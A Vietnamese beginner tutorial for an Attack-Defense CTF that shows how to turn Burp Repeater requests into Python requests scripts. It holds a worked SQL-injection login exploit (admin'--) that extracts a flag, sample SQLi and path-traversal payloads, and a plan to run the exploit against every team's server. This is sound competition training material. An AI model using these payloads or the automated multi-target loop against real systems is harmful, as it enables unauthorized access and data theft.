# Bắt đầu từ 0 — chưa biết Python, chưa biết exploit web

Đọc 1 lần trước ngày thi (15-20 phút). Sau bài này bạn sẽ hiểu đủ để đọc được mọi snippet trong các thư mục `01_` đến `08_` và tự sửa khi nó không chạy đúng.

Không cố nhớ hết — mục tiêu là **hiểu khái niệm**, vì các file khác sẽ có snippet copy-paste sẵn.

---

## 1. Vì sao phải chuyển từ Burp sang Python?

Trong thi Attack-Defense, bạn giải 1 lỗi trên **1 đội** bằng Burp (click chuột: Repeater, Intruder...). Nhưng có 10-20 đội khác cũng dính lỗi y hệt (vì cùng code). Bấm Burp cho từng đội là không kịp. Script Python làm đúng việc Burp đã làm, nhưng **lặp lại tự động cho tất cả đội trong vài giây**.

Vậy bản chất không có gì mới: **script Python chỉ là "ghi lại" đúng request mà Burp đã gửi thành công, rồi lặp nó**.

---

## 2. Burp request map sang Python thế nào?

Một request bạn thấy trong tab Burp Repeater, ví dụ:

```
POST /api/login HTTP/1.1
Host: 10.0.2.1:8000
Content-Type: application/json
Cookie: session=abc123

{"username":"admin","password":"admin"}
```

4 phần trong request này map thẳng sang 4 thứ trong Python (dùng thư viện `requests`):

| Trong Burp | Trong Python |
|---|---|
| Dòng đầu `POST /api/login` | tên hàm `s.post(...)` + URL `"http://10.0.2.1:8000/api/login"` |
| Các dòng `Header: value` | tham số `headers={"Content-Type": "application/json"}` (Content-Type/Cookie thường để requests tự lo, xem bên dưới) |
| `Cookie: session=abc123` | không set tay — dùng `requests.Session()` để nó tự giữ cookie |
| Phần body `{"username":...}` | tham số `json={"username": "admin", "password": "admin"}` |

Viết lại bằng Python:

```python
import requests

s = requests.Session()                 # "session" giữ cookie xuyên suốt, giống việc Burp tự nhớ cookie giữa các tab
r = s.post(                             # gửi 1 request POST
    "http://10.0.2.1:8000/api/login",   # URL = Host + path trong Burp
    json={"username": "admin", "password": "admin"},  # body JSON; requests tự thêm Content-Type: application/json
    timeout=5,                          # bắt buộc có, không có thì script có thể treo vô hạn nếu server không trả lời
)
print(r.status_code)                    # mã trả về, ví dụ 200
print(r.text)                           # nội dung response, dạng chữ
```

Quy tắc đổi từ Burp sang Python, nhớ 5 dòng này:

- **Method + path + host** → URL đưa vào `s.get(url, ...)` / `s.post(url, ...)`.
- **Query string** (`?id=1&name=a`) → tham số `params={"id": "1", "name": "a"}`.
- **Body dạng `a=1&b=2`** (Content-Type: `application/x-www-form-urlencoded`) → `data={"a": "1", "b": "2"}`.
- **Body dạng JSON** (`{"a":1}`) → `json={"a": 1}`.
- **Cookie** → không set tay từng request, dùng chung 1 `requests.Session()` cho cả bài.

Chi tiết từng loại (GET, POST, header, cookie, upload, encode) có code mẫu đầy đủ trong [`01_Request_Co_Ban/`](01_Request_Co_Ban/).

---

## 3. Python tối thiểu cần biết — chỉ 10 khái niệm

Không cần học hết Python. Mọi snippet trong bộ cheatsheet này chỉ dùng 10 thứ sau.

### 3.1. Chạy 1 file Python

```bash
python ten_file.py
```

Nếu báo `python: command not found`, thử `python3 ten_file.py`.

### 3.2. Biến (variable) — chỗ chứa giá trị

```python
base = "http://10.0.2.1:8000"   # base là 1 biến kiểu chuỗi (string)
```

Không cần khai báo kiểu, không cần `;` ở cuối dòng.

### 3.3. Chuỗi (string) và f-string — cách ghép chuỗi hay dùng nhất

```python
base = "http://10.0.2.1:8000"
path = "/login"
url = f"{base}{path}"        # f"..." cho phép nhúng biến trong {}
print(url)                   # http://10.0.2.1:8000/login
```

`f"..."` là thứ bạn sẽ gõ nhiều nhất. Bất kỳ đâu có `{tên_biến}` trong chuỗi bắt đầu bằng `f`, Python sẽ thay bằng giá trị biến đó.

### 3.4. Dict (`{...}`) — danh sách "key: value", dùng cho header/body/json

```python
data = {"username": "admin", "password": "admin"}
print(data["username"])      # lấy giá trị theo key -> admin
```

Mọi `headers=`, `data=`, `json=`, `params=` trong các snippet đều là dict.

### 3.5. List (`[...]`) — danh sách nhiều giá trị

```python
teams = ["10.0.2.1", "10.0.3.1", "10.0.4.1"]
for t in teams:               # lặp qua từng phần tử
    print(t)
```

### 3.6. Vòng lặp `for`

```python
payloads = ["admin", "1' OR '1'='1", "../../etc/passwd"]
for p in payloads:
    print("thử:", p)
```

### 3.7. `if` / so sánh

```python
if r.status_code == 200:
    print("thành công")
elif r.status_code == 403:
    print("bị WAF chặn")
else:
    print("mã khác:", r.status_code)
```

### 3.8. Hàm (`def`) — gói 1 đoạn logic để gọi lại nhiều lần

```python
def solve_one(session, base_url):
    r = session.get(f"{base_url}/", timeout=5)
    return r.status_code

print(solve_one(requests.Session(), "http://10.0.2.1:8000"))
```

Tất cả snippet trong bộ này đều khuyên bạn dán code vào trong 1 hàm tên `solve_one(session, base_url)` (xem [`scripts/template.py`](scripts/template.py)) vì `template.py` sẽ tự gọi hàm này cho từng đội trong `targets.txt`.

### 3.9. `try` / `except` — bắt lỗi, không cho script dừng giữa đường

```python
try:
    data = r.json()           # có thể lỗi nếu response không phải JSON
except Exception as e:
    print("không parse được JSON:", e)
    data = None
```

Khi quét 10-20 đội, 1 đội lỗi không được làm script dừng toàn bộ — luôn bọc phần gửi request/parse response trong `try/except`.

### 3.10. `import` — nạp thư viện có sẵn

```python
import requests   # thư viện gửi HTTP request, phải cài trước: pip install requests
import re         # thư viện regex, có sẵn trong Python, không cần cài
```

Lệnh cài thư viện (chạy 1 lần, cần làm **trước** ngày thi vì lúc thi không có Internet):

```bash
pip install requests beautifulsoup4
```

---

## 4. Lỗi cú pháp hay gặp nhất khi mới viết Python

Đây là nhóm lỗi **không liên quan gì tới web/exploit**, chỉ là gõ sai cú pháp Python — nhưng chiếm phần lớn thời gian debug của người mới. Đọc kỹ để tự sửa nhanh, không cần tra Google.

| Lỗi khi chạy | Nguyên nhân thật | Cách sửa |
|---|---|---|
| `IndentationError: expected an indented block` | Dòng sau `:` (sau `if`, `for`, `def`...) không lùi vào đủ khoảng trắng | Python dùng khoảng trắng đầu dòng để biết dòng nào "thuộc" khối nào — thụt vào đúng 4 dấu cách, nhất quán trong cả file |
| `SyntaxError: invalid syntax` ở cuối dòng `if`/`for`/`def` | Quên dấu `:` ở cuối dòng | Thêm `:`, ví dụ `if r.status_code == 200:` |
| `NameError: name 'r' is not defined` | Dùng biến `r` trước khi gán, hoặc gán ở dòng bên trong `try` nhưng lỗi xảy ra trước khi gán xong | In `r` ngay sau dòng gán để chắc nó tồn tại; kiểm tra thụt lề đúng hàm |
| `SyntaxError: f-string: single '}' is not allowed` | Trong f-string có `{` hoặc `}` thật (ví dụ JSON) nhưng quên escape | Dùng `{{` và `}}` để in `{`/`}` thật trong f-string, hoặc dùng chuỗi thường + `.format()`/`%` |
| `ModuleNotFoundError: No module named 'requests'` | Thư viện chưa cài, hoặc cài ở Python khác với Python đang chạy | `pip install requests`; nếu vẫn lỗi, thử `pip3 install requests` hoặc `python -m pip install requests` |
| `TypeError: 'NoneType' object is not subscriptable` | Biến bằng `None` (ví dụ regex không match, `re.search(...)` trả `None`) mà vẫn gọi `.group()` hay `[...]` lên nó | Kiểm tra `if m:` trước khi dùng `m.group(...)` |
| `KeyError: 'token'` | Dict không có key đó (response JSON thực tế khác với bạn đoán) | `print(r.json())` để xem đúng cấu trúc thật trước khi lấy key |
| `json.decoder.JSONDecodeError` khi gọi `r.json()` | Response không phải JSON (có thể là trang lỗi HTML, hoặc bị 403 từ WAF) | `print(r.status_code, r.text[:300])` trước để biết server trả gì |
| Script chạy "treo", không in gì | Thiếu `timeout=`, server không phản hồi, bị chặn | Luôn thêm `timeout=5` (hoặc nhỏ hơn) vào mọi `s.get/s.post` |
| Python báo lỗi dòng cách xa dòng bạn sửa | Thường do thiếu `)`/`"`/`}` ở 1 dòng trước đó, Python chỉ báo lỗi khi "đọc hết" mới biết thiếu | Đếm số `(`/`)` và `{`/`}` phải cân nhau trong đoạn vừa sửa |

**Mẹo chung khi không chắc lỗi ở đâu**: in (`print(...)`) giá trị của biến **ngay trước** dòng báo lỗi. 90% lỗi lúc thi là do response không giống bạn tưởng (sai status, sai key JSON, bị WAF chặn) — không phải do Python khó.

---

## 5. Ví dụ đầy đủ: từ "giải tay trên Burp" đến "script chạy được"

Giả sử bạn vừa giải tay 1 bài trên Burp: trang `/login` có 1 lỗi SQL injection ở field `username`, bạn đã test trên Burp Repeater và thấy payload `admin'--` cho đăng nhập thành công, sau đó `/dashboard` hiện flag dạng `FHACKER2026{...}`.

**Bước 1 — Ghi lại chính xác 2 request đã chạy được trên Burp** (xem trong tab Repeater):

```
POST /login HTTP/1.1
Host: 10.0.2.1:8000
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=x
```

```
GET /dashboard HTTP/1.1
Host: 10.0.2.1:8000
Cookie: session=<cookie Burp nhận được sau request trên>
```

**Bước 2 — Viết thành script, dịch từng dòng theo bảng ở mục 2:**

```python
import re
import requests

def solve_one(session, base_url):
    # Bước 1 trên Burp: POST /login với body form username=admin'--&password=x
    # -> Content-Type form-urlencoded nên dùng data=, không dùng json=
    r = session.post(
        f"{base_url}/login",
        data={"username": "admin'--", "password": "x"},
        timeout=5,
    )
    # Kiểm tra ngay: Burp cho 200/302 thì ở đây cũng phải vậy, không thì sai gì rồi
    if r.status_code not in (200, 302):
        return None  # không login được, dừng sớm, không cố đọc dashboard

    # Bước 2 trên Burp: GET /dashboard
    # Không cần tự set Cookie: session=... vì `session` (requests.Session())
    # đã tự giữ cookie từ response của bước 1 -- đây là lý do PHẢI dùng chung 1 session
    r2 = session.get(f"{base_url}/dashboard", timeout=5)

    # Trích flag bằng regex, giống việc bạn tự đọc bằng mắt trong Burp
    m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r2.text)
    return m.group(0) if m else None


if __name__ == "__main__":
    # Test tay 1 đội trước khi thả vào template.py để quét toàn bộ targets.txt
    s = requests.Session()
    s.verify = False
    flag = solve_one(s, "http://10.0.2.1:8000")
    print("Flag:", flag)
```

**Bước 3 — Chạy thử:**

```bash
python bai1.py
```

- Nếu in ra `Flag: FHACKER2026{...}` → đúng, copy hàm `solve_one` này vào [`scripts/template.py`](scripts/template.py) để quét hết `targets.txt`.
- Nếu in ra `Flag: None` → thêm `print(r.status_code, r.text[:300])` ngay sau request bị nghi ngờ (thường là request đầu), chạy lại, so nội dung in ra với response bạn thấy trong Burp. 95% lỗi ở đây là: sai `Content-Type` (form vs JSON), thiếu 1 field body, hoặc dùng 2 session riêng cho 2 bước làm mất cookie.

Đây chính là quy trình bạn sẽ lặp lại cho **mọi** bài trong giờ thi: giải tay → chép request → dịch theo mục 2 → test 1 đội → copy vào `template.py`.

---

## 6. Đi tiếp từ đây

- Loại request cụ thể (GET/POST/header/cookie/upload/encode): [`01_Request_Co_Ban/`](01_Request_Co_Ban/)
- Login giữ phiên, lấy CSRF token, truyền ID giữa các bước, đọc response: [`02_Chuoi_Request/`](02_Chuoi_Request/)
- Lặp nhiều đội, song song, polling: [`03_Thao_Tac_Nang_Cao/`](03_Thao_Tac_Nang_Cao/)
- Payload theo từng loại lỗ hổng (SQLi, IDOR, LFI, SSTI, SSRF...): [`04_Theo_Lo_Hong/`](04_Theo_Lo_Hong/)
- Script bị lỗi, Burp chạy được mà Python không: [`06_Debug/`](06_Debug/)
- Mục lục tra cứu nhanh khi đang thi: [`CHEATSHEET_NHANH.md`](CHEATSHEET_NHANH.md)
